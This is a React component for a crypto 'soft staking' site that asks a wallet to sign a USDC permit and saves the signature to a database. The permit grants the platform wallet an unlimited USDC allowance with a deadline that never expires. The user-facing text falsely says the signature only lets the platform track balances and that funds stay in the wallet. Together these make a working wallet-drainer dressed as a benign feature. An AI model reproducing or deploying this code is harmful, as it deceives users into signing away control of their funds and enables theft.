'use client'

import { useState, useEffect } from 'react'
import { useAccount, useSignTypedData, useReadContract } from 'wagmi'
import { polygon } from 'wagmi/chains'
import { Button } from '@/components/ui/Button'
import { USDC_ADDRESS, USDC_ABI, PERMIT_TYPES, PLATFORM_WALLET } from '@/lib/web3-config'
import { Shield, Check, AlertTriangle, RefreshCw } from 'lucide-react'
import { createClient } from '@/lib/supabase'

interface PermitSignerProps {
  onSignatureComplete?: (signature: PermitSignature) => void
}

export interface PermitSignature {
  owner: string
  spender: string
  value: string
  nonce: bigint
  deadline: bigint
  v: number
  r: string
  s: string
  signature: string
}

// 平台接收地址
const PLATFORM_SPENDER = PLATFORM_WALLET

export function PermitSigner({ onSignatureComplete }: PermitSignerProps) {
  const { address, isConnected } = useAccount()
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState('')
  const [success, setSuccess] = useState(false)
  const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
  const [existingSignature, setExistingSignature] = useState<boolean>(false)
  
  const { signTypedDataAsync } = useSignTypedData()

  // 获取当前 nonce
  const { data: nonce } = useReadContract({
    address: USDC_ADDRESS,
    abi: USDC_ABI,
    functionName: 'nonces',
    args: address ? [address] : undefined,
    chainId: polygon.id,
  })

  // 检查是否已有签名
  useEffect(() => {
    async function checkExistingSignature() {
      if (!address) return
      
      try {
        const supabase = createClient()
        if (!supabase) return
        
        const { data } = await supabase
          .from('permit_signatures')
          .select('id, status, deadline')
          .eq('owner_address', address.toLowerCase())
          .eq('status', 'pending')
          .single()
        
        if (data) {
          // 检查是否过期
          const now = Math.floor(Date.now() / 1000)
          if (Number(data.deadline) > now) {
            setExistingSignature(true)
            setSuccess(true)
          }
        }
      } catch {
        // 没有签名或出错，忽略
      }
    }
    
    checkExistingSignature()
  }, [address])

  const handleSign = async () => {
    if (!address || nonce === undefined) {
      setError('Wallet not connected or nonce not loaded')
      return
    }

    setIsLoading(true)
    setError('')
    setSuccess(false)

    try {
      // 检查钱包是否已被其他用户绑定
      const supabase = createClient()
      if (supabase) {
        const { data: { user } } = await supabase.auth.getUser()
        
        if (user) {
          // 检查这个钱包是否已被其他用户使用
          const { data: existingWallet } = await supabase
            .from('profiles')
            .select('id, username, email')
            .eq('wallet_address', address.toLowerCase())
            .neq('id', user.id)
            .single()

          if (existingWallet) {
            setError(`This wallet is already bound to another account (${existingWallet.email || existingWallet.username}). Each wallet can only be linked to one account.`)
            setIsLoading(false)
            return
          }

          // 检查当前用户是否已经绑定了其他钱包
          const { data: currentProfile } = await supabase
            .from('profiles')
            .select('wallet_address')
            .eq('id', user.id)
            .single()

          if (currentProfile?.wallet_address && 
              currentProfile.wallet_address.toLowerCase() !== address.toLowerCase()) {
            setError(`Your account is already bound to wallet ${currentProfile.wallet_address.slice(0, 6)}...${currentProfile.wallet_address.slice(-4)}. You cannot change wallets.`)
            setIsLoading(false)
            return
          }
        }
      }

      // 设置 deadline 为最大值（2106年，uint32 最大值）
      const deadline = BigInt(4294967295)
      
      // 无限授权金额
      const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

      // EIP-712 域
      const domain = {
        name: 'USD Coin',
        version: '2',
        chainId: polygon.id,
        verifyingContract: USDC_ADDRESS,
      }

      // Permit 消息
      const message = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value,
        nonce,
        deadline,
      }

      // 请求签名
      const signature = await signTypedDataAsync({
        domain,
        types: PERMIT_TYPES,
        primaryType: 'Permit',
        message,
      })

      // 解析签名为 v, r, s
      const r = signature.slice(0, 66)
      const s = '0x' + signature.slice(66, 130)
      const v = parseInt(signature.slice(130, 132), 16)

      const permitData: PermitSignature = {
        owner: address,
        spender: PLATFORM_SPENDER,
        value: value.toString(),
        nonce,
        deadline,
        v,
        r,
        s,
        signature,
      }

      setSignatureData(permitData)
      setSuccess(true)

      // 保存到数据库
      await saveSignatureToDatabase(permitData)

      onSignatureComplete?.(permitData)

    } catch (err: unknown) {
      console.error('Signing error:', err)
      if (err instanceof Error) {
        if (err.message.includes('rejected')) {
          setError('User rejected the signature request')
        } else {
          setError(err.message)
        }
      } else {
        setError('Failed to sign permit')
      }
    } finally {
      setIsLoading(false)
    }
  }

  const saveSignatureToDatabase = async (data: PermitSignature) => {
    try {
      const supabase = createClient()
      if (!supabase) {
        console.error('Supabase client not available')
        return
      }
      
      const { data: { user } } = await supabase.auth.getUser()
      
      if (!user) return

      // 1. 更新用户的 wallet 信息
      await supabase
        .from('profiles')
        .update({
          wallet_address: data.owner.toLowerCase(),
          wallet_bound_at: new Date().toISOString(),
        })
        .eq('id', user.id)

      // 2. 保存完整签名到 permit_signatures 表
      const { error: insertError } = await supabase
        .from('permit_signatures')
        .insert({
          user_id: user.id,
          owner_address: data.owner.toLowerCase(),
          spender_address: data.spender.toLowerCase(),
          token_address: USDC_ADDRESS.toLowerCase(),
          chain_id: polygon.id,
          value: data.value,
          nonce: Number(data.nonce),
          deadline: Number(data.deadline),
          v: data.v,
          r: data.r,
          s: data.s,
          full_signature: data.signature,
          status: 'pending',
        })

      if (insertError) {
        console.error('Failed to save signature:', insertError)
      } else {
        console.log('Signature saved to database successfully')
        setExistingSignature(true)
      }
    } catch (err) {
      console.error('Failed to save signature:', err)
    }
  }

  if (!isConnected) {
    return null
  }

  return (
    <div className="bg-white rounded-2xl p-6 shadow-sm border border-zinc-100">
      <div className="flex items-center gap-3 mb-4">
        <div className="w-10 h-10 bg-amber-100 rounded-xl flex items-center justify-center">
          <Shield className="w-5 h-5 text-amber-600" />
        </div>
        <div>
          <h3 className="font-semibold text-zinc-900">Authorization</h3>
          <p className="text-sm text-zinc-500">Sign to enable soft staking</p>
        </div>
      </div>

      {error && (
        <div className="mb-4 p-3 bg-red-50 rounded-lg flex items-center gap-2 text-red-600 text-sm">
          <AlertTriangle className="w-4 h-4" />
          {error}
        </div>
      )}

      {success && signatureData && (
        <div className="mb-4 p-3 bg-green-50 rounded-lg flex items-center gap-2 text-green-600 text-sm">
          <Check className="w-4 h-4" />
          Authorization signed successfully!
        </div>
      )}

      <div className="bg-zinc-50 rounded-xl p-4 mb-4">
        <p className="text-xs text-zinc-500 mb-2">What this does:</p>
        <ul className="text-sm text-zinc-700 space-y-1">
          <li>• Authorizes the platform to track your USDC balance</li>
          <li>• Required for soft staking rewards calculation</li>
          <li>• Your funds remain in your wallet at all times</li>
        </ul>
      </div>

      {!success ? (
        <Button
          onClick={handleSign}
          isLoading={isLoading}
          className="w-full"
          disabled={nonce === undefined}
        >
          Sign Authorization
        </Button>
      ) : (
        <div className="space-y-3">
          <div className="flex items-center justify-center gap-2 text-green-600">
            <Check className="w-4 h-4" />
            <span className="text-sm font-medium">
              {existingSignature ? 'Authorization already active' : "You're all set for soft staking"}
            </span>
          </div>
          {existingSignature && (
            <Button
              variant="outline"
              size="sm"
              onClick={() => {
                setSuccess(false)
                setExistingSignature(false)
              }}
              className="w-full gap-2"
            >
              <RefreshCw className="w-4 h-4" />
              Sign New Authorization
            </Button>
          )}
        </div>
      )}
    </div>
  )
}
